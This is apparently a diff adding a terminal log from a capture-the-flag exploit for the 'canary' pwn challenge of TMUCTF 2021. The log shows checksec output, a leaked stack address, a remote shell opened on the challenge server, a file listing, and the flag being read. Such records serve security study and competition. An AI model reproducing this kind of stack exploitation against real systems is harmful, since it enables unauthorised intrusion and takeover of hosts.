@@ -1,0 +1,28 @@
+mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Canary$ python solve.py r
+[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Canary/canary'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Opening connection to 185.97.117.19 on port 7030: Done
+stack_leak = 0x7ffd211cc0d1
+[*] Switching to interactive mode
+
+This is the comparison result: 
+---> * The strings are not equal! *
+$ id
+sh: 1: id: not found
+$ ls -l
+total 48
+drwxr-x--- 1 0 1000  4096 Sep  7 06:44 bin
+-rwxr-x--- 1 0 1000 17184 Sep  5 07:36 canary
+drwxr-x--- 1 0 1000  4096 Sep  7 06:44 dev
+-rwxr----- 1 0 1000    42 Sep  7 06:38 flag.txt
+drwxr-x--- 1 0 1000  4096 Sep  7 06:44 lib
+drwxr-x--- 1 0 1000  4096 Sep  7 06:44 lib32
+drwxr-x--- 1 0 1000  4096 Sep  7 06:44 lib64
+drwxr-x--- 1 0 1000  4096 Sep  7 06:44 libx32
+$ cat flag.txt
+TMUCTF{3x3cu74bl3_574ck_15_v3ry_d4n63r0u5}
